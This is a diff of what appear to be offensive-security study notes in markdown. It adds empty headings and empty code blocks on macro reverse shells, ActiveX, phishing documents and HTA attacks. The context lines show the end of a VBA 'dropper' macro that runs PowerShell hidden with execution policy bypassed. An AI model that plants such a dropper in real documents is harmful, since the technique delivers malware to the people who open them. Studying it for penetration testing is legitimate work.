@@ -638,7 +638,33 @@ Sub dropper()
     Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", vbHide
 End Sub
 ```
+#### VBA Reverse Shell Macro with Powercat
 
+```bash
+```
+
+#### Using ActiveX Controls for Macro Execution
+
+```bash
+```
+
+#### Pretexting Phishing Documents
+
+```bash
+```
+
+#### HTML Applications (HTA)
+
+```bash
+```
+#### HTA Attacks
+
+```bash
+```
+#### Automating Macro Development with MacroPack
+
+```bash
+```
 ## 03 - Web Application Penetration Testing
 ## 04 - Network Penetration Testing
 ## 05 - System Security & x86 Assembly Fundamentals
